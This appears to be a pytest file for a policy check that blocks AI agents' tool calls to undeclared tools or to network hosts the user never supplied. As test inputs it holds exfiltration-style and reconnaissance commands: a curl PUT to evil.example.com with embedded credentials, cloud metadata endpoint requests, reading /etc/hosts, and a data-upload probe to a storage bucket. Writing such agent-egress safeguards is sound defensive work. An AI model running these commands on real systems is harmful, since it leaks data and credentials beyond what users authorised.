# Copyright 2026-present the HuggingFace Inc. team.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import json

from conftest import OSS, bash_request

from safeagents import DEFAULT_ALLOWED_HOSTS, Policy, declared_tools, extract_hosts


def test_declared_tools_reads_both_formats():
    assert declared_tools({"tools": [{"type": "function", "function": {"name": "read_file"}}]}) == {"read_file"}
    assert declared_tools({"tools": [{"name": "get_weather", "input_schema": {}}]}) == {"get_weather"}


def test_extracts_url_hosts_and_bare_ips():
    text = '{"cmd": "curl -X PUT https://user:pw@Evil.Example.com:8443/x && curl 169.254.169.254/latest; cat file:///etc/hosts"}'
    assert extract_hosts(text) == ["169.254.169.254", "evil.example.com"]
    assert extract_hosts("pip install torch==2.5.1 && ls ./src/main.rs") == []
    assert extract_hosts("version 1.2.3.4.5 and 999.1.1.1") == []


def test_declared_tool_with_unseen_host_is_blocked():
    # The Cohere case: `bash` is declared, but the bucket URL came from nowhere.
    policy = Policy(bash_request("Write a detection rule for curl downloads to /tmp."))
    reason = policy.check("bash", f'{{"cmd": "curl -o /tmp/put_probe -X PUT --data-binary PROBE https://{OSS}/probe"}}')
    assert OSS in reason
    assert policy.check("bash", '{"cmd": "curl http://169.254.169.254/latest/meta-data/"}')
    assert policy.check("shell", "{}") == "undeclared tool"


def test_host_from_user_or_allowlist_is_fine():
    policy = Policy(bash_request("Download https://data.example.org/file.csv please"), DEFAULT_ALLOWED_HOSTS)
    assert policy.check("bash", '{"cmd": "curl -O https://data.example.org/file.csv"}') is None
    assert policy.check("bash", '{"cmd": "git clone https://github.com/huggingface/transformers"}') is None
    assert policy.check("bash", '{"cmd": "curl http://localhost:8080/health"}') is None


def test_host_only_in_model_turns_does_not_count():
    request = bash_request("hi")
    request["messages"].append({"role": "assistant", "content": f"I will use https://{OSS}"})
    assert Policy(request).check("bash", f"curl https://{OSS}/x")


def test_host_in_written_data_is_fine():
    # From training rollouts that were blocked: URLs and IPs a call writes as data, with no request made
    request = bash_request("Write a CLF log parser and a click log generator, with tests.")
    request["tools"].append({"type": "function", "function": {"name": "write"}})
    policy = Policy(request)
    line = "10.0.0.1 - bob [10/Oct/2000:13:55:36 -0700] \\\"GET /a HTTP/1.0\\\" 200 5 \\\"http://x.com\\\" \\\"curl/7.68.0\\\""
    assert policy.check("write", f'{{"path": "test_clf.py", "content": "LINE = \\"{line}\\""}}') is None
    assert policy.check("bash", "{\"command\": \"printf 'user_000,2026-08-01T00:00:00Z,http://a.com\\\\n' > clicks.csv\"}") is None
    assert policy.check("write", '{"content": "# see http://home.online.no/~pjacklam/notes/invnorm/"}') is None
    assert policy.check("bash", '{"command": "python3 -m http.server 8080 --bind 0.0.0.0 &"}') is None


def test_reserved_hosts_are_fine_and_requests_are_still_checked():
    policy = Policy(bash_request("hi"), allowed_hosts=())
    assert policy.check("bash", '{"cmd": "curl https://click.example.com/x https://example.org"}') is None
    assert policy.check("bash", '{"cmd": "python -c \\"import requests; requests.get(\'https://www.google.com/search?q=task\')\\""}')
    assert policy.check("web_fetch", '{"url": "https://en.wikipedia.org/wiki/Genetic_code"}') == "undeclared tool"
    request = bash_request("hi")
    request["tools"].append({"type": "function", "function": {"name": "web_extract"}})
    assert Policy(request).check("web_extract", '{"urls": ["https://fineenvs-rl-explorer.hf.space/t/x"]}')


def test_ips_in_fixtures_beside_a_request_are_fine():
    # From training rollouts that were blocked: an escaped newline before `cat` read as `ncat`, and IPs in a log fixture
    # (or a version pin) taken for addresses because the same call also made a request
    policy = Policy(bash_request("Write a log summariser for /app/logs."))
    fixture = "cat > a.log <<'EOF'\n1.2.3.4 - - [07/Nov/2020:01:30:00 -0700] \"GET /x HTTP/1.0\" 200 1\nEOF\n./summarise a.log"
    assert policy.check("bash", json.dumps({"command": fixture})) is None
    assert policy.check("bash", json.dumps({"command": "curl -s http://localhost:8080/health\n" + fixture})) is None
    assert policy.check("bash", json.dumps({"command": "pip install t-digest==0.5.1.4"})) is None
    assert policy.check("bash", json.dumps({"command": "curl -s http://10.9.8.7/x"}))
    assert policy.check("bash", json.dumps({"command": "import urllib.request\nURL = 'https://reveng.online/a.json'"}))
